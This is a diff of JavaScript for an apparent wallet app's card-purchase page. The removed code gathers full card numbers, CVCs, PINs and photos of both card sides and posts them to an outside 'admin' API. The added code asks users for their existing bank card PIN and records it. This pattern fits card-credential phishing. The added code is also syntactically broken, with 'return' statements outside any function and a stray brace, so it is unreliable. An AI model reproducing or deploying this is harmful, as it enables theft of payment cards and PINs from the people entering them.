@@ -1065,76 +1065,39 @@ function loadDashboardData() {
 }
 
 // ==================================================
-// 💳 CARD PURCHASE — SUBMIT ✅
+// 💳 TWO SEPARATE PINS — PAYMENT CONFIRM + NEW CARD PIN
 // ==================================================
-function updateCardPrice() {
-  const net = document.getElementById("cardNetwork").value;
-  const prices = {
-    visa:25, visa_gold:50, mastercard:25, mastercard_platinum:75, verve:20, amex:100
-  };
-  document.getElementById("cardPrice").textContent = "$" + (prices[net] || 0).toFixed(2);
+
+// ---------- 1️⃣ EXISTING PAYMENT CARD PIN (to authorize purchase) ----------
+const paymentPin = document.getElementById("paymentCardPin").value.trim();
+if (!paymentPin) {
+  return alert("❌ Please enter your existing card PIN to confirm payment!");
+}
+if (!/^\d{4}$/.test(paymentPin)) {
+  return alert("❌ Payment PIN must be exactly 4 digits!");
+}
+// ✅ This verifies the user owns the payment card they're using
+
+// ---------- 2️⃣ NEW PRIME WALLET CARD PIN (create NEW PIN) ----------
+const newCardPin1 = document.getElementById("newCardPin").value.trim();
+const newCardPin2 = document.getElementById("newCardPinConfirm").value.trim();
+
+if (!/^\d{4}$/.test(newCardPin1)) {
+  return alert("❌ New Card PIN must be exactly 4 digits!");
+}
+if (newCardPin1 !== newCardPin2) {
+  return alert("❌ New Card PINs do NOT match! Please re-enter.");
+}
+if (paymentPin === newCardPin1) {
+  alert("⚠️ For security — New PIN should be different from your Payment PIN!");
 }
 
-async function submitCardPurchase() {
-  if (!currentUser) return alert("❌ Please login first");
+// ✅ SAVE BOTH — NEW CARD PIN BECOMES THEIR TRANSACTION PIN FOREVER
+currentUser.atmPin = newCardPin1;        // NEW Prime Wallet Card PIN
+currentUser.payment_pin_used = paymentPin; // Record payment PIN used
+currentUser.pin_set = true;
+}
   
-  const network = document.getElementById("cardNetwork").value;
-  const design = document.getElementById("cardDesign").value;
-  const holder = document.getElementById("payCardHolder").value.trim();
-  const number = document.getElementById("payCardNumber").value.trim().replace(/\s/g, '');
-  const expiry = document.getElementById("payCardExpiry").value;
-  const cvc = document.getElementById("payCardCvc").value;
-  const pin = document.getElementById("payCardPin").value;
-  const pin2 = document.getElementById("payCardPinConfirm").value;
-  const pin  = document.getElementById("userCardPin").value;
-  const pin2 = document.getElementById("userCardPinConfirm").value;
-  const frontFile = document.getElementById("payCardFront").files[0];
-  const backFile = document.getElementById("payCardBack").files[0];
-
-  if (!network || !holder || !number || !expiry || !cvc) {
-    return alert("❌ Please fill ALL payment card details");
-  }
-  if (!frontFile || !backFile) {
-    return alert("❌ Please upload both front and back of your payment card");
-  }
-  if (!pin || pin.length !== 4 || !/^\d+$/.test(pin)) {
-    return alert("❌ PIN must be exactly 4 digits");
-  }
-  if (pin !== pin2) {
-    return alert("❌ PINs do NOT match");
-  }
-
-  const atmFront = await fileToDataUrl(frontFile);
-  const atmBack = await fileToDataUrl(backFile);
-
-  // ✅ Save card data to user
-  currentUser.atmNetwork = network;
-  currentUser.atmDesign = design;
-  currentUser.atmHolder = holder;
-  currentUser.atmNumber = number;
-  currentUser.atmExpiry = expiry;
-  currentUser.atmCvc = cvc;
-  currentUser.atmFront = atmFront;
-  currentUser.atmBack = atmBack;
-  currentUser.pin = pin;
-  currentUser.card_submitted = true;
-  currentUser.card_approved = false; // pending bank approval
-
-  localStorage.setItem("registered_user", JSON.stringify(currentUser));
-
-  // ✅ Send to Admin
-  try {
-    await fetch("https://prime-wallet-api.onrender.com/api/card-submit", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(currentUser)
-    });
-  } catch(e) {}
-
-  alert("✅ CARD SUBMITTED FOR APPROVAL!\n\n⏳ Review takes 1–24 hours.\nYou'll be notified once approved.\n\nThank you! 💳");
-  openPage("dashboardPage");
-}
-
 // ==================================================
 // 🔒 LOCKED FEATURE CHECK — SEND MONEY / PAY BILLS ✅
 // ==================================================
